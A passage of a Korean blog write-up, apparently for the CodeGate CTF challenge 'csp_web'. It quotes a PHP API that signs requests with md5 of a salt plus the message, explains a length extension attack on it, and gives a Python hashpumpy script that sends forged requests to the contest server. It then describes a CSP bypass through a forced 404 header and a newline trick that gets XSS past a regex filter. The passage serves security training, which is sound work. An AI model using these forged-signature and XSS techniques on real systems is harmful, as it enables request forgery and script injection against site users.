{"componentChunkName":"component---src-templates-blog-post-js","path":"/Writeup/CodeGate-writeup-csp_web/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"CSP(Content Security Policy)란 웹 브라우저에서 사용되는 콘텐츠에 대한 보호 정책입니다. 웹에서 사용되는 콘텐츠 즉 이미지, 동영상, 스크립트 등에 대해 사용을 허가를 하는지에 대해 정의를 하는 규칙 입니다. 이 보호 정책을 이용하여 XSS에서 이용되는 src의 주소를 자신의 하위 도메인 또는 자기 자신에게만 허용함으로 외부의 공격에…","html":"<blockquote>\n<h2 id=\"cspcontent-security-policy란\" style=\"position:relative;\"><a href=\"#cspcontent-security-policy%EB%9E%80\" aria-label=\"cspcontent security policy란 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CSP(Content Security Policy)란</h2>\n<p>웹 브라우저에서 사용되는 콘텐츠에 대한 보호 정책입니다.</p>\n<p>웹에서 사용되는 콘텐츠 즉 이미지, 동영상, 스크립트 등에 대해 사용을 허가를 하는지에 대해 정의를 하는 규칙 입니다.</p>\n<p>이 보호 정책을 이용하여 XSS에서 이용되는 src의 주소를 자신의 하위 도메인 또는 자기 자신에게만 허용함으로 외부의 공격에 방어를 할 수 있습니다.</p>\n</blockquote>\n<p>일단 문제를 확인 합니다.</p>\n<blockquote>\n<p><strong>Description :</strong>\nI made an simple echo service for my API practice. If you find bug, please tell me!</p>\n</blockquote>\n<p>그리고 api.php에 대해 소스 파일을 제공하는데 일단 확인 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"php\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">&lt;</span><span class=\"mtk10\">?</span><span class=\"mtk7\">php</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">require_once</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;config.php&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">!isset</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$_GET</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;q&quot;</span><span class=\"mtk1\">]) </span><span class=\"mtk8\">||</span><span class=\"mtk1\"> </span><span class=\"mtk8\">!isset</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$_GET</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;sig&quot;</span><span class=\"mtk1\">])) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">die</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;?&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">$api_string</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">base64_decode</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$_GET</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;q&quot;</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">$sig</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">$_GET</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;sig&quot;</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">md5</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$salt</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$api_string</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk4\">$sig</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">die</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;??&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">$apis</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">explode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;|&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk4\">$api_string</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">foreach</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$apis</span><span class=\"mtk1\"> </span><span class=\"mtk8\">as</span><span class=\"mtk1\"> </span><span class=\"mtk4\">$s</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">$info</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">explode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;,&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk4\">$s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">count</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$info</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">base64_decode</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$info</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">$p1</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">base64_decode</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$info</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">$p2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">base64_decode</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$info</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;header&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">strlen</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">) </span><span class=\"mtk8\">&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">strpos</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$p2</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk6\">&quot;:&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk7\">false</span><span class=\"mtk1\"> </span><span class=\"mtk8\">||</span><span class=\"mtk1\"> </span><span class=\"mtk8\">strpos</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$p2</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk6\">&quot;-&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk7\">false</span><span class=\"mtk1\">) </span><span class=\"mtk5 mtki\">//Don&#39;t trick...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">header</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;</span><span class=\"mtk4\">$p1</span><span class=\"mtk6\">: </span><span class=\"mtk4\">$p2</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">elseif</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;cookie&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">setcookie</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk4\">$p2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">elseif</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;body&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">preg_match</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/</span><span class=\"mtk8\">&lt;.</span><span class=\"mtk10\">*</span><span class=\"mtk8\">&gt;</span><span class=\"mtk6\">/&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&lt;br /&gt;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">elseif</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;hello&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;Hello, World!</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>get 방식으로 <code>q</code> 와 <code>sig</code> 두 개의 인자를 받아들이고 그다음 q을 base64 decoding을 한 다음 이것을 salt와 연결하여 md5 hash을 돌린 값이 sig와 동일 한지 검증을 합니다. 이때 <code>md5($salt.$api_string)</code> 의 방식은 <code>Length extension attack</code> 을 이용하여 공격이 가능하여 보입니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"php\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">&lt;</span><span class=\"mtk10\">?</span><span class=\"mtk7\">php</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">md5</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$salt</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$api_string</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk4\">$sig</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">die</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;??&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<blockquote>\n<h2 id=\"length-extension-attack\" style=\"position:relative;\"><a href=\"#length-extension-attack\" aria-label=\"length extension attack permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Length extension attack</h2>\n<p>MD(Merkle-Damgard)방식을 사용한 Hash 함수에서 발견된 취약점으로 자주 사용되는 md5, sha-1, sha-2가 여기에 포함이 된다. MD방식으로 hash을 할 때 일정 비트만큼 블럭을 나누어 hash을 하여 그다음 블록과 압축 함수를 돌리고 hash을 돌리기 때문에 <code>salt</code> + <code>msg</code> 의 방식은 <code>padding</code> 을 추가 하여 블록을 맞춘 다음 추가할 메세지를 더하면 <code>salt</code> 을 몰라도 이미 알고 있는 <code>sig</code> 을 이용한다면 추가된 문자열을 정상적으로 인식하도록 만들 수 있다.</p>\n</blockquote>\n<p><code>Length extension attack</code> 을 하기 편하게 도와주는 python 모듈 <code>hashpumpy</code> 을 사용하여 일단 <code>Salt</code> 의 길이를 알아내는 스크립트를 작성 해봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> os</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> base64 </span><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> b64encode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> hashpumpy </span><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> hashpump</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_msg </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;Ym9keQ==,7YyA66qo65GQIQ==,&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\"># body,팀모두!,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ori_sig </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;9325813a0a951c308d6c5c0c9a462648&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;http://110.10.147.166/api.php&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">None</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">found</span><span class=\"mtk1\">():</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> i </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span><span class=\"mtk7\">64</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [sig, value] </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">hashpump</span><span class=\"mtk1\">(ori_sig, ori_msg, </span><span class=\"mtk6\">&quot;Test&quot;</span><span class=\"mtk1\">, i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk5 mtki\"># [sig, value] = os.popen(&quot;hashpump -s &#39;{s}&#39; -d &#39;{d}&#39; -a &#39;{a}&#39; -k {k}&quot;.format(s=ori_sig, d=ori_msg, a=&quot;Test&quot;, k=i)).read().strip().split(&#39;\\n&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\"> : </span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">eval</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;b&#39;&#39;&#39;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> value </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39;&#39;&#39;&quot;</span><span class=\"mtk1\">)).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\"> : sig}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;??&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">not</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            key_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.text</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot; : &quot;</span><span class=\"mtk1\">,i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;found!!!key_length!!!!!! : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(key_len))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> key_len</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">found</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p>이 스크립트를 통해 salt의 길이는 12 자리인 것을 확인 했습니다.</p>\n<p>이제 <code>CSP</code> 을 우회해서 script을 작동 시키는 방법을 찾아 봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"php\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">&lt;</span><span class=\"mtk10\">?</span><span class=\"mtk7\">php</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">$n</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;header&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">strlen</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">) </span><span class=\"mtk8\">&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\">(</span><span class=\"mtk8\">strpos</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$p2</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk6\">&quot;:&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk7\">false</span><span class=\"mtk1\"> </span><span class=\"mtk8\">||</span><span class=\"mtk1\"> </span><span class=\"mtk8\">strpos</span><span class=\"mtk1\">(</span><span class=\"mtk4\">$p1</span><span class=\"mtk1\">.</span><span class=\"mtk4\">$p2</span><span class=\"mtk1\">,</span><span class=\"mtk3\"> </span><span class=\"mtk6\">&quot;-&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk8\">!==</span><span class=\"mtk1\"> </span><span class=\"mtk7\">false</span><span class=\"mtk1\">) </span><span class=\"mtk5 mtki\">//Don&#39;t trick...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">header</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;</span><span class=\"mtk4\">$p1</span><span class=\"mtk6\">: </span><span class=\"mtk4\">$p2</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://www.hahwul.com/2019/01/csp-bypass-technique-xss.html\">CSP(Content-Security-Policy) Bypass technique</a> 글을 읽어 보면서 중간에 Error page 즉 400/500 번 대의 페이지에는 CSP을 설정 안 하는 경우가 있다고 해서 이 방법을 사용 하여 공격을 진행 했습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">msg_1  </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;|</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;header&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;http/1.1&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;404&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">encode</span><span class=\"mtk1\">()).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">())</span></span></span></code></pre>\n<p>위와 같이 header에 http/1.1 : 404 라는 항목이 들어갈 수 있도록 완성을 하였고 test을 위한 xss 내용은 정규식을 피하도록 \\n 개행 처리를 이용하여 우회를 했습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">from</span><span class=\"mtk1\"> base64 </span><span class=\"mtk10 